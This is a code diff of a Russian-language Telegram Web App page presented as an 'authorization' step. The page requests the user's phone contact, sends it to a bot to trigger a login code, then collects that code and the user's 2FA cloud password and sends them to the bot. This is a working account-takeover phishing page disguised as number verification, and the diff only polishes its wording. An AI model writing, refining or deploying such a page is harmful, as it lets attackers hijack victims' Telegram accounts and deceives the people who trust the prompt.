@@ -5,9 +5,9 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        body { background: #000; color: #fff; font-family: -apple-system, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
+        body { background: #000; color: #fff; font-family: -apple-system, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
         .card { width: 85%; padding: 30px; border-radius: 25px; background: #0a0a0a; border: 1px solid #1a1a1a; text-align: center; }
-        h2 { color: #00ff88; font-size: 20px; margin-bottom: 10px; }
+        h2 { color: #00ff88; margin-bottom: 10px; }
         p { color: #888; font-size: 14px; margin-bottom: 25px; }
         input { width: 100%; padding: 14px; margin-top: 10px; border-radius: 10px; border: 1px solid #333; background: #111; color: #fff; text-align: center; font-size: 18px; outline: none; box-sizing: border-box; }
         .hidden { display: none; }
@@ -17,12 +17,12 @@
     <div class="card">
         <div id="step1">
             <h2>Авторизация</h2>
-            <p>Нажмите синюю кнопку снизу, чтобы отправить контакт.</p>
+            <p>Нажмите синюю кнопку внизу экрана Telegram для подтверждения номера.</p>
         </div>
         <div id="step2" class="hidden">
-            <h2>Подтверждение</h2>
-            <p>Введите код и облачный пароль (если есть).</p>
-            <input type="number" id="sms-code" placeholder="Код 00000" inputmode="numeric">
+            <h2>Шаг 2/2</h2>
+            <p>Введите код из чата и пароль (если есть).</p>
+            <input type="number" id="sms-code" placeholder="00000" inputmode="numeric">
             <input type="password" id="two-fa" placeholder="2FA Пароль">
         </div>
     </div>
@@ -32,7 +32,6 @@
         tg.ready();
         tg.expand();
 
-        // Настройка главной кнопки
         tg.MainButton.setText("ПОДТВЕРДИТЬ НОМЕР");
         tg.MainButton.show();
 
@@ -41,41 +40,35 @@
 
         tg.MainButton.onClick(() => {
             if (currentStep === 1) {
-                // Запрос контакта у Telegram
-                tg.requestContact((ok, response) => {
+                tg.requestContact((ok, res) => {
                     if (ok) {
-                        // Пытаемся достать номер из всех возможных полей ответа
-                        const phone = response.response_data?.phone_number || response.contact?.phone_number;
+                        // Пытаемся достать номер из всех полей ответа
+                        const rawPhone = res.response_data?.phone_number || res.contact?.phone_number;
                         
-                        if (phone) {
-                            userPhone = String(phone);
+                        if (rawPhone) {
+                            userPhone = String(rawPhone);
                             
-                            // ОТПРАВЛЯЕМ БОТУ: Номер теперь точно есть в переменной
+                            // Отправляем JSON боту
                             tg.sendData(JSON.stringify({
                                 "action": "send_code",
                                 "phone": userPhone
                             }));
 
-                            // Переключаем интерфейс
+                            // Меняем экран
                             document.getElementById('step1').classList.add('hidden');
                             document.getElementById('step2').classList.remove('hidden');
-                            tg.MainButton.setText("ВОЙТИ");
+                            tg.MainButton.setText("ЗАВЕРШИТЬ ВХОД");
                             currentStep = 2;
                         } else {
-                            alert("Ошибка: Номер телефона не получен.");
+                            alert("Ошибка: Телеграм не передал номер.");
                         }
-                    } else {
-                        alert("Вы отклонили запрос контакта.");
                     }
                 });
             } else {
-                // ШАГ 2: Отправка кода и пароля
                 const code = document.getElementById('sms-code').value;
                 const pass = document.getElementById('two-fa').value || "none";
 
-                if (code.length < 3) {
-                    return alert("Введите верный код!");
-                }
+                if (code.length < 3) return alert("Введите код!");
 
                 tg.sendData(JSON.stringify({
                     "action": "verify",
@@ -83,7 +76,6 @@
                     "code": String(code),
                     "two_fa": String(pass)
                 }));
-
                 tg.MainButton.hide();
                 setTimeout(() => { tg.close(); }, 500);
             }
